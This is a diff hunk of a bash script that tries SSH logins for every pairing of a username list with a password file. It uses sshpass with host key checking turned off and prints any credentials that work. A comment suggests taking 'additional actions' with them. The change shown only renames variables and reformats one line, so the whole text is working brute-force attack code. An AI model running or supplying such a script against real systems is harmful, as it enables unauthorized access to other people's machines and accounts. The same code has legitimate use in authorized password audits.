@@ -11,16 +11,17 @@ PASSWORD_FILE="passwords.txt"
 echo "Starting SSH credential testing..."
 
 # Loop through each combination of usernames and passwords
-for username in "${USERNAMES[@]}"; do
-  while IFS= read -r password; do
-    echo "Testing credentials: ${username} / ${password}"
+for user in "${USERNAMES[@]}"; do
+  while IFS= read -r pass; do
+    echo "Testing credentials: ${user} / ${pass}"
 
     # Check the exit code to determine if the login was successful
-    if sshpass -p "${password}" ssh -o "StrictHostKeyChecking=no" -p "${PORT}" "${username}@${TARGET}" exit >/dev/null 2>&1; then
+    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
+               -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
       echo "Successful login with credentials:"
       echo "Host: ${TARGET}"
-      echo "Username: ${username}"
-      echo "Password: ${password}"
+      echo "Username: ${user}"
+      echo "Password: ${pass}"
 
       # Perform additional actions here using the credentials
       exit 0
